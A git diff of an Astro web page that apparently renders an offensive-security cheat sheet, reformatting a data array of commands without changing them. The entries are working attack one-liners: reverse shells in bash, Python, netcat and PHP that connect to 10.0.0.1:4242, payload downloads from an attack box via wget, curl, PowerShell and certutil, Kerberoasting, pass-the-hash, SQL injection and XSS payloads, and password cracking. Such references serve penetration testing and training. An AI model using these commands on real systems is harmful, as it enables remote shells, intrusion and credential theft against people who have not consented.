@@ -2,100 +2,237 @@
 import MainGridLayout from "../layouts/MainGridLayout.astro";
 
 const categories = [
-  {
-    name: "Reverse Shells",
-    id: "shells",
-    icon: "material-symbols:terminal-rounded",
-    commands: [
-      { cmd: "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1", desc: "Bash TCP Reverse Shell", difficulty: "Easy", tags: ["linux", "bash", "network"] },
-      { cmd: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", desc: "Python3 Reverse Shell", difficulty: "Medium", tags: ["scripting", "python", "linux"] },
-      { cmd: "nc -e /bin/sh 10.0.0.1 4242", desc: "Netcat Traditional", difficulty: "Easy", tags: ["netcat", "linux", "backdoor"] },
-      { cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f", desc: "Netcat OpenBSD (No -e)", difficulty: "Medium", tags: ["netcat", "fifo", "linux"] },
-      { cmd: "php -r '$sock=fsockopen(\"10.0.0.1\",4242);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", desc: "PHP Reverse Shell", difficulty: "Medium", tags: ["web", "php"] }
-    ]
-  },
-  {
-    name: "TTY Upgrade",
-    id: "tty",
-    icon: "material-symbols:keyboard-command-key-rounded",
-    commands: [
-      { cmd: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", desc: "Python PTY Spawn", difficulty: "Easy", tags: ["post-exploit", "python", "shell"] },
-      { cmd: "export TERM=xterm", desc: "Set xterm", difficulty: "Easy", tags: ["env"] },
-      { cmd: "stty raw -echo; fg", desc: "STTY Raw Mode (After Ctrl+Z)", difficulty: "Medium", tags: ["interactive", "terminal"] }
-    ]
-  },
-  {
-    name: "File Transfer",
-    id: "transfer",
-    icon: "material-symbols:cloud-download-rounded",
-    commands: [
-      { cmd: "python3 -m http.server 8000", desc: "Attack Box Server", difficulty: "Easy", tags: ["python", "server", "http"] },
-      { cmd: "wget http://10.0.0.1:8000/file.exe -O file.exe", desc: "Linux Wget", difficulty: "Easy", tags: ["linux", "download"] },
-      { cmd: "curl http://10.0.0.1:8000/file.exe -o file.exe", desc: "Linux Curl", difficulty: "Easy", tags: ["linux", "curl"] },
-      { cmd: "iwr -uri http://10.0.0.1:8000/file.exe -OutFile file.exe", desc: "Windows PowerShell", difficulty: "Easy", tags: ["windows", "powershell"] },
-      { cmd: "certutil -urlcache -f http://10.0.0.1:8000/file.exe file.exe", desc: "Windows Certutil", difficulty: "Medium", tags: ["windows", "bypass"] }
-    ]
-  },
-  {
-    name: "Network & SMB",
-    id: "network",
-    icon: "material-symbols:router-rounded",
-    commands: [
-      { cmd: "nmap -sC -sV -p- -T4 10.10.x.x", desc: "Nmap Full Scan", difficulty: "Easy", tags: ["recon", "nmap"] },
-      { cmd: "smbclient -L //10.10.x.x/", desc: "List SMB Shares", difficulty: "Easy", tags: ["smb", "recon"] },
-      { cmd: "enum4linux -a 10.10.x.x", desc: "Enum4Linux All", difficulty: "Medium", tags: ["smb", "enumeration"] }
-    ]
-  },
-  {
-    name: "Active Directory",
-    id: "ad",
-    icon: "material-symbols:hub-rounded",
-    commands: [
-      { cmd: "impacket-GetNPUsers domain.local/ -usersfile users.txt -format john -dc-ip 10.10.x.x", desc: "AS-REP Roasting", difficulty: "Medium", tags: ["ad", "kerberos", "impacket"] },
-      { cmd: "impacket-GetUserSPNs domain.local/user:pass -dc-ip 10.10.x.x -request", desc: "Kerberoasting", difficulty: "Hard", tags: ["ad", "kerberos", "impacket"] }
-    ]
-  },
-  {
-    name: "Lateral Movement",
-    id: "lateral",
-    icon: "material-symbols:directions-run-rounded",
-    commands: [
-      { cmd: "evil-winrm -i 10.10.x.x -u user -H hash", desc: "Pass-The-Hash WinRM", difficulty: "Medium", tags: ["winrm", "powershell", "hash"] },
-      { cmd: "impacket-psexec administrator@10.10.x.x -hashes :hash", desc: "Impacket PsExec Hash", difficulty: "Hard", tags: ["impacket", "windows", "psexec"] }
-    ]
-  },
-  {
-    name: "Web Exploitation",
-    id: "web",
-    icon: "material-symbols:language-rounded",
-    commands: [
-      { cmd: "' OR 1=1 --", desc: "SQLi Auth Bypass", difficulty: "Easy", tags: ["sqli", "auth"] },
-      { cmd: "UNION SELECT 1,2,3,database(),user()--", desc: "SQLi Union Enumeration", difficulty: "Medium", tags: ["sqli", "recon"] },
-      { cmd: "<script>alert('XSS')</script>", desc: "Basic XSS Payload", difficulty: "Easy", tags: ["xss", "client-side"] }
-    ]
-  },
-  {
-    name: "Password Cracking",
-    id: "cracking",
-    icon: "material-symbols:lock-open-rounded",
-    commands: [
-      { cmd: "ssh2john id_rsa > hash.txt; john --wordlist=rockyou.txt hash.txt", desc: "SSH Key Cracking", difficulty: "Easy", tags: ["john", "ssh", "passwords"] },
-      { cmd: "hashcat -m 22900 hash.txt rockyou.txt", desc: "Hashcat SSH Hash", difficulty: "Medium", tags: ["hashcat", "gpu", "passwords"] }
-    ]
-  },
-  {
-    name: "Exploit Dev",
-    id: "exploit",
-    icon: "material-symbols:bug-report-rounded",
-    commands: [
-      { cmd: "msf-pattern_create -l 500", desc: "Metasploit Pattern Create", difficulty: "Medium", tags: ["bof", "patterns"] },
-      { cmd: "msf-pattern_offset -q <address>", desc: "Metasploit Pattern Offset", difficulty: "Hard", tags: ["bof", "debugging"] }
-    ]
-  }
+	{
+		name: "Reverse Shells",
+		id: "shells",
+		icon: "material-symbols:terminal-rounded",
+		commands: [
+			{
+				cmd: "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1",
+				desc: "Bash TCP Reverse Shell",
+				difficulty: "Easy",
+				tags: ["linux", "bash", "network"],
+			},
+			{
+				cmd: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
+				desc: "Python3 Reverse Shell",
+				difficulty: "Medium",
+				tags: ["scripting", "python", "linux"],
+			},
+			{
+				cmd: "nc -e /bin/sh 10.0.0.1 4242",
+				desc: "Netcat Traditional",
+				difficulty: "Easy",
+				tags: ["netcat", "linux", "backdoor"],
+			},
+			{
+				cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f",
+				desc: "Netcat OpenBSD (No -e)",
+				difficulty: "Medium",
+				tags: ["netcat", "fifo", "linux"],
+			},
+			{
+				cmd: 'php -r \'$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");\'',
+				desc: "PHP Reverse Shell",
+				difficulty: "Medium",
+				tags: ["web", "php"],
+			},
+		],
+	},
+	{
+		name: "TTY Upgrade",
+		id: "tty",
+		icon: "material-symbols:keyboard-command-key-rounded",
+		commands: [
+			{
+				cmd: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+				desc: "Python PTY Spawn",
+				difficulty: "Easy",
+				tags: ["post-exploit", "python", "shell"],
+			},
+			{
+				cmd: "export TERM=xterm",
+				desc: "Set xterm",
+				difficulty: "Easy",
+				tags: ["env"],
+			},
+			{
+				cmd: "stty raw -echo; fg",
+				desc: "STTY Raw Mode (After Ctrl+Z)",
+				difficulty: "Medium",
+				tags: ["interactive", "terminal"],
+			},
+		],
+	},
+	{
+		name: "File Transfer",
+		id: "transfer",
+		icon: "material-symbols:cloud-download-rounded",
+		commands: [
+			{
+				cmd: "python3 -m http.server 8000",
+				desc: "Attack Box Server",
+				difficulty: "Easy",
+				tags: ["python", "server", "http"],
+			},
+			{
+				cmd: "wget http://10.0.0.1:8000/file.exe -O file.exe",
+				desc: "Linux Wget",
+				difficulty: "Easy",
+				tags: ["linux", "download"],
+			},
+			{
+				cmd: "curl http://10.0.0.1:8000/file.exe -o file.exe",
+				desc: "Linux Curl",
+				difficulty: "Easy",
+				tags: ["linux", "curl"],
+			},
+			{
+				cmd: "iwr -uri http://10.0.0.1:8000/file.exe -OutFile file.exe",
+				desc: "Windows PowerShell",
+				difficulty: "Easy",
+				tags: ["windows", "powershell"],
+			},
+			{
+				cmd: "certutil -urlcache -f http://10.0.0.1:8000/file.exe file.exe",
+				desc: "Windows Certutil",
+				difficulty: "Medium",
+				tags: ["windows", "bypass"],
+			},
+		],
+	},
+	{
+		name: "Network & SMB",
+		id: "network",
+		icon: "material-symbols:router-rounded",
+		commands: [
+			{
+				cmd: "nmap -sC -sV -p- -T4 10.10.x.x",
+				desc: "Nmap Full Scan",
+				difficulty: "Easy",
+				tags: ["recon", "nmap"],
+			},
+			{
+				cmd: "smbclient -L //10.10.x.x/",
+				desc: "List SMB Shares",
+				difficulty: "Easy",
+				tags: ["smb", "recon"],
+			},
+			{
+				cmd: "enum4linux -a 10.10.x.x",
+				desc: "Enum4Linux All",
+				difficulty: "Medium",
+				tags: ["smb", "enumeration"],
+			},
+		],
+	},
+	{
+		name: "Active Directory",
+		id: "ad",
+		icon: "material-symbols:hub-rounded",
+		commands: [
+			{
+				cmd: "impacket-GetNPUsers domain.local/ -usersfile users.txt -format john -dc-ip 10.10.x.x",
+				desc: "AS-REP Roasting",
+				difficulty: "Medium",
+				tags: ["ad", "kerberos", "impacket"],
+			},
+			{
+				cmd: "impacket-GetUserSPNs domain.local/user:pass -dc-ip 10.10.x.x -request",
+				desc: "Kerberoasting",
+				difficulty: "Hard",
+				tags: ["ad", "kerberos", "impacket"],
+			},
+		],
+	},
+	{
+		name: "Lateral Movement",
+		id: "lateral",
+		icon: "material-symbols:directions-run-rounded",
+		commands: [
+			{
+				cmd: "evil-winrm -i 10.10.x.x -u user -H hash",
+				desc: "Pass-The-Hash WinRM",
+				difficulty: "Medium",
+				tags: ["winrm", "powershell", "hash"],
+			},
+			{
+				cmd: "impacket-psexec administrator@10.10.x.x -hashes :hash",
+				desc: "Impacket PsExec Hash",
+				difficulty: "Hard",
+				tags: ["impacket", "windows", "psexec"],
+			},
+		],
+	},
+	{
+		name: "Web Exploitation",
+		id: "web",
+		icon: "material-symbols:language-rounded",
+		commands: [
+			{
+				cmd: "' OR 1=1 --",
+				desc: "SQLi Auth Bypass",
+				difficulty: "Easy",
+				tags: ["sqli", "auth"],
+			},
+			{
+				cmd: "UNION SELECT 1,2,3,database(),user()--",
+				desc: "SQLi Union Enumeration",
+				difficulty: "Medium",
+				tags: ["sqli", "recon"],
+			},
+			{
+				cmd: "<script>alert('XSS')</script>",
+				desc: "Basic XSS Payload",
+				difficulty: "Easy",
+				tags: ["xss", "client-side"],
+			},
+		],
+	},
+	{
+		name: "Password Cracking",
+		id: "cracking",
+		icon: "material-symbols:lock-open-rounded",
+		commands: [
+			{
+				cmd: "ssh2john id_rsa > hash.txt; john --wordlist=rockyou.txt hash.txt",
+				desc: "SSH Key Cracking",
+				difficulty: "Easy",
+				tags: ["john", "ssh", "passwords"],
+			},
+			{
+				cmd: "hashcat -m 22900 hash.txt rockyou.txt",
+				desc: "Hashcat SSH Hash",
+				difficulty: "Medium",
+				tags: ["hashcat", "gpu", "passwords"],
+			},
+		],
+	},
+	{
+		name: "Exploit Dev",
+		id: "exploit",
+		icon: "material-symbols:bug-report-rounded",
+		commands: [
+			{
+				cmd: "msf-pattern_create -l 500",
+				desc: "Metasploit Pattern Create",
+				difficulty: "Medium",
+				tags: ["bof", "patterns"],
+			},
+			{
+				cmd: "msf-pattern_offset -q <address>",
+				desc: "Metasploit Pattern Offset",
+				difficulty: "Hard",
+				tags: ["bof", "debugging"],
+			},
+		],
+	},
 ];
 
 const allDifficulties = ["Easy", "Medium", "Hard"];
-const allCommandFlat = categories.flatMap(cat => cat.commands.map(cmd => ({ ...cmd, category: cat.name })));
+const allCommandFlat = categories.flatMap((cat) =>
+	cat.commands.map((cmd) => ({ ...cmd, category: cat.name })),
+);
 ---
 <MainGridLayout title="CheatSheet" description="SecOps Manual & Offensive Snippets">
     <div class="flex flex-col gap-8 w-full pb-20 onload-animation">
